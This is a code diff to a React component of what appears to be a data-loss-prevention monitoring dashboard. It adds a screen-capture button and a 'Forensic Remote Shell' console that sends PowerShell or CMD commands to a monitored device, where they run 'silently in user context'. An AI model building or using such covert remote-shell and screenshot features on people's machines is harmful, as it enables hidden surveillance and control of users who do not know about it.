@@ -92,17 +92,28 @@ export default function DlpModule({ userId, userDisplayName, sinceDate }: { user
         link.setAttribute("download", `DLP_Events_${userDisplayName.replace(/\s+/g, '_')}.csv`);
         link.click();
     };
-    const handleScan = async () => {
-        if (!window.confirm('Trigger a remote Data Discovery Scan on this device?')) return;
+    const [shellCommand, setShellCommand] = useState("");
+    const [shellResult, setShellResult] = useState<string | null>(null);
+
+    const handleCommand = async (type: string, payload: any = {}) => {
         setLoading(true);
         try {
-            const res = await fetch(`/api/devices/${userId}/scan`, { method: 'POST' });
+            const res = await fetch(`/api/devices/${userId}/scan`, { 
+                method: 'POST',
+                body: JSON.stringify({ type, payload })
+            });
             const data = await res.json();
-            if (!res.ok) throw new Error(data.error || 'Failed to trigger scan');
-            alert('Scan command queued. Results will appear in the log within 60 seconds.');
+            if (!res.ok) throw new Error(data.error || 'Failed to trigger command');
+            
+            if (type === 'shell') {
+                alert('Shell command sent. Waiting for response...');
+                // Long poll for result could be added, but for now we wait for events
+            } else {
+                alert(`${type} command queued successfully.`);
+            }
             fetchEvents();
         } catch (err: any) {
-            alert(`Scan Error: ${err.message}`);
+            alert(`Command Error: ${err.message}`);
         } finally {
             setLoading(false);
         }
@@ -111,37 +122,84 @@ export default function DlpModule({ userId, userDisplayName, sinceDate }: { user
     return (
         <div className="space-y-6 animate-in fade-in duration-500 text-left">
             {/* Control Bar */}
-            <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 bg-slate-950 p-6 rounded-2xl border border-slate-800">
-                <div className="flex items-center gap-3">
-                    <div className="p-3 bg-rose-500/10 rounded-2xl border border-rose-500/20">
-                        <ShieldAlert size={24} className="text-rose-500" />
+            <div className="flex flex-col gap-6 bg-slate-950 p-6 rounded-2xl border border-slate-800 shadow-2xl">
+                <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
+                    <div className="flex items-center gap-3">
+                        <div className="p-3 bg-rose-500/10 rounded-2xl border border-rose-500/20">
+                            <ShieldAlert size={24} className="text-rose-500" />
+                        </div>
+                        <div>
+                            <h3 className="text-xl font-bold text-white uppercase tracking-tight">Data Loss Prevention v2.0</h3>
+                            <p className="text-xs text-slate-500 font-mono tracking-widest uppercase mt-0.5">Forensic Stealth & Remote Orchestration</p>
+                        </div>
                     </div>
-                    <div>
-                        <h3 className="text-xl font-bold text-white uppercase tracking-tight">Data Loss Prevention</h3>
-                        <p className="text-xs text-slate-500 font-mono tracking-widest uppercase mt-0.5">Real-time Exfiltration Monitoring</p>
+
+                    <div className="flex flex-wrap items-center gap-3">
+                        <button 
+                            onClick={() => handleCommand('SCREENSHOT')}
+                            disabled={loading}
+                            className="flex items-center gap-2 px-4 py-2 bg-rose-600 hover:bg-rose-700 text-white rounded-xl transition-all text-[10px] font-black uppercase tracking-widest disabled:opacity-50"
+                        >
+                            <Camera size={14} /> {loading ? 'Capturing...' : 'Capture Screen'}
+                        </button>
+                        <button 
+                            onClick={() => handleCommand('SCAN_DEVICE')}
+                            disabled={loading}
+                            className="flex items-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-xl transition-all text-[10px] font-black uppercase tracking-widest disabled:opacity-50"
+                        >
+                            <Search size={14} /> Discovery Scan
+                        </button>
+                        <button 
+                            onClick={downloadCSV}
+                            className="p-2 bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-800 rounded-xl transition-all"
+                            title="Export CSV"
+                        >
+                            <Download size={16} />
+                        </button>
+                        <button 
+                            onClick={fetchEvents}
+                            className="p-2 bg-slate-900 border border-slate-800 rounded-xl text-slate-400 hover:text-white transition-all"
+                        >
+                            <RefreshCw size={16} className={loading ? 'animate-spin' : ''} />
+                        </button>
                     </div>
                 </div>
 
-                <div className="flex flex-wrap items-center gap-4">
-                    <button 
-                        onClick={handleScan}
-                        disabled={loading}
-                        className="flex items-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-xl transition-all text-[10px] font-black uppercase tracking-widest disabled:opacity-50"
-                    >
-                        <Search size={14} /> {loading ? 'Scanning...' : 'Scan Device'}
-                    </button>
-                    <button 
-                        onClick={downloadCSV}
-                        className="flex items-center gap-2 px-4 py-2 bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-800 rounded-xl transition-all text-[10px] font-black uppercase tracking-widest"
-                    >
-                        <Download size={14} /> Export CSV
-                    </button>
-                    <button 
-                        onClick={fetchEvents}
-                        className="p-2.5 bg-slate-900 border border-slate-800 rounded-xl text-slate-400 hover:text-white transition-all"
-                    >
-                        <RefreshCw size={16} className={loading ? 'animate-spin' : ''} />
-                    </button>
+                {/* Remote Shell Console (Pierogi Style) */}
+                <div className="bg-black border border-slate-800 rounded-xl overflow-hidden shadow-inner">
+                    <div className="bg-slate-900 px-4 py-2 flex items-center justify-between border-b border-slate-800">
+                        <div className="flex items-center gap-2">
+                            <div className="flex gap-1.5">
+                                <div className="w-2.5 h-2.5 rounded-full bg-rose-500/50" />
+                                <div className="w-2.5 h-2.5 rounded-full bg-amber-500/50" />
+                                <div className="w-2.5 h-2.5 rounded-full bg-emerald-500/50" />
+                            </div>
+                            <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest ml-2">Forensic Remote Shell</span>
+                        </div>
+                        <span className="text-[10px] font-mono text-emerald-500">CONNECTED</span>
+                    </div>
+                    <div className="p-4 flex flex-col gap-4">
+                        <div className="flex gap-3">
+                            <span className="text-emerald-500 font-mono text-sm leading-8">C:\&gt;</span>
+                            <input 
+                                type="text"
+                                placeholder="Enter PowerShell or CMD command..."
+                                className="flex-1 bg-transparent border-none outline-none text-emerald-400 font-mono text-sm placeholder:text-slate-800 h-8"
+                                value={shellCommand}
+                                onChange={(e) => setShellCommand(e.target.value)}
+                                onKeyDown={(e) => e.key === 'Enter' && handleCommand('shell', { command: shellCommand })}
+                            />
+                            <button 
+                                onClick={() => handleCommand('shell', { command: shellCommand })}
+                                className="px-4 bg-emerald-500/10 text-emerald-500 border border-emerald-500/20 text-[10px] font-black uppercase rounded-lg hover:bg-emerald-500 hover:text-black transition-all"
+                            >
+                                Execute
+                            </button>
+                        </div>
+                        <p className="text-[9px] text-slate-600 font-mono uppercase tracking-widest italic">
+                            Commands are executed silently in user context. Results appear in the activity log.
+                        </p>
+                    </div>
                 </div>
             </div>
 
